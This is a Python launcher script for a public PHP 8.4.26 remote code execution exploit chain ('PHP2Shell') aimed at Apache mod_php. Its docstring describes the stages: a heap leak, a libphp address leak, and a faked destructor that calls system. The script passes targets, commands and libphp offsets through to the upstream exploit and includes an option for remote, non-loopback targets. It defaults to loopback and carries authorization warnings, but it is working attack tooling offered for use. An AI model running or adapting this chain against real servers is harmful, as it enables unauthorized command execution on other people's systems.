#!/usr/bin/env python3
"""
php2shell_rce.py — launcher for the verified PHP2Shell RCE chain.

Background
----------
The public exploit by 9bie (https://github.com/9bie/php2shell-bypass-aslr-exp)
implements the full pure-HTTP chain against PHP 8.4.26 + Apache prefork +
mod_php:

    stage 1  Set-Cookie heap leak      -> Zend MM chunk base
    stage 2  Set-Cookie libphp leak    -> libphp base (zval_ptr_dtor)
    stage 3  upload_progress fake ref  -> pDestructor = zif_system
    PROOF:   uid=33(www-data) ...

It requires display_errors=On, memory_limit=8M, max_input_vars=1000,
session.use_cookies=1, session.use_strict_mode=0 and a single-worker prefork.
Those are laboratory conditions. Production PHP usually has a higher
memory_limit and displays errors off; the same chain then needs a different
heap calibration and/or a display_errors=Off leak.

This launcher does not reimplement the exploit and does not clone it: it uses
the bootstrapped upstream checkout (which has no license file, so it is used
from its own checkout) and runs it with the right arguments. Use it only against systems you own or have
written authorization to test.

Verified on this machine: PHP 8.4.26 + Apache 2.4.69 + mod_php, 3/3 runs,
PROOF uid=33(www-data).

PHP 8.3.33 note
---------------
A port of stages 1-2 to PHP 8.3.33 works (heap base and libphp base are leaked),
but the stage-3 heap layout differs and is not calibrated. This launcher does
not claim RCE on PHP 8.3.33.
"""

from __future__ import annotations

import argparse
import ipaddress
import os
import socket
import subprocess
import sys
import urllib.parse

from php2shell_paths import default_repo_dir
from php2shell_upstream import patch_params, patch_tls

DEFAULT_DIR = default_repo_dir()


def is_loopback(host: str) -> bool:
    try:
        infos = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
    except socket.gaierror:
        return False
    for info in infos:
        try:
            if not ipaddress.ip_address(info[4][0]).is_loopback:
                return False
        except ValueError:
            return False
    return True


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Run the verified PHP2Shell RCE chain against an authorized target.")
    ap.add_argument("-u", "--target", required=True,
                    help="target PHP page, e.g. http://127.0.0.1:8088/index.php")
    ap.add_argument("-c", "--command", default="id>/out/p1",
                    help="command to execute (max 14 bytes; default: id>/out/p1)")
    ap.add_argument("--profile", choices=("bookworm", "lab"), default="bookworm",
                    help="target build profile (default: bookworm, PHP 8.4.26 image)")
    ap.add_argument("--container", default="php2shell-target",
                    help="local container used to auto-read libphp offsets")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None,
                    help="zif_system offset in libphp.so (remote targets)")
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None,
                    help="zval_ptr_dtor offset in libphp.so (remote targets)")
    ap.add_argument("--proof-file", default=None,
                    help="local file the command writes to (default: <repo>/out/p1); use '' for remote")
    ap.add_argument("--fetch", default="",
                    help="remote proof: GET this path after exploitation (e.g. /p1)")
    ap.add_argument("--huge-mb", type=int, default=None,
                    help="OOM field size in MiB; must exceed the target memory_limit")
    ap.add_argument("--repo-dir", default=DEFAULT_DIR, help="checkout directory")
    ap.add_argument("--allow-remote", action="store_true",
                    help="allow non-loopback targets (written authorization required)")
    ap.add_argument("--insecure", action="store_true",
                    help="disable TLS certificate verification (self-signed/mismatched lab certs)")
    args = ap.parse_args()

    host = urllib.parse.urlsplit(args.target if "://" in args.target else "http://" + args.target).hostname or ""
    if not args.allow_remote and not is_loopback(host):
        print(f"[!] {host} is not loopback; use --allow-remote only with authorization.", file=sys.stderr)
        return 4
    if args.allow_remote and (args.zif_offset is None or args.dtor_offset is None):
        print("[!] remote targets need --zif-offset and --dtor-offset for that libphp build.",
              file=sys.stderr)
        return 4

    repo = args.repo_dir
    exploit = os.path.join(repo, "exploit.py")
    if not os.path.isfile(exploit):
        print('[!] upstream exploit.py not found; run "python3 tools/bootstrap_upstream.py" '
              "or pass --repo-dir", file=sys.stderr)
        return 4
    patch_params(repo)
    if args.insecure:
        patch_tls(repo)

    proof = args.proof_file or os.path.join(repo, "out", "p1")
    cmd = [sys.executable, exploit, "-u", args.target, "-c", args.command,
           "--profile", args.profile, "--proof-file", proof]
    if args.zif_offset is not None:
        cmd += ["--zif-offset", hex(args.zif_offset)]
    if args.dtor_offset is not None:
        cmd += ["--dtor-offset", hex(args.dtor_offset)]
    if args.fetch:
        cmd += ["--fetch", args.fetch]
    if args.huge_mb:
        cmd += ["--huge-mb", str(args.huge_mb)]
    if args.allow_remote:
        cmd += ["--no-auto-offsets"]
    else:
        cmd += ["--docker-container", args.container]

    print("[*] running upstream PHP2Shell RCE chain", flush=True)
    print("[*] requirements: display_errors=On, memory_limit=8M, single-worker prefork", flush=True)
    return subprocess.call(cmd)


if __name__ == "__main__":
    sys.exit(main())
